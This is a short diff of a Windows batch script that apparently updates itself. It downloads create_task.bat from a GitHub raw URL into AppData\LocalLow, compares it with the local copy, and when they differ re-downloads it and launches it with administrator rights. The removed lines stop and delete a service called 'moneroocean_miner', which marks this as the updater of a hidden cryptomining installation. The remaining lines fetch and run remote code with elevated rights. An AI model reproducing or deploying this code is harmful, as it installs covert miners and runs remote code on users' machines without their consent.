@@ -5,8 +5,6 @@
 		powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/abyssalvoid123/autosetup/master/create_task.bat', '%USERPROFILE%\AppData\LocalLow\create_task_new.bat')"
 		fc /b %USERPROFILE%\AppData\LocalLow\create_task_new.bat %USERPROFILE%\AppData\LocalLow\create_task.bat > nul
 		if errorlevel 1 (
-			sc stop moneroocean_miner
-			sc delete moneroocean_miner
 			powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/abyssalvoid123/autosetup/master/create_task.bat', '%USERPROFILE%\AppData\LocalLow\create_task.bat')"
 			powershell -Command "Start-Process '%USERPROFILE%\AppData\LocalLow\create_task.bat' -Verb runAs"
 		) else (
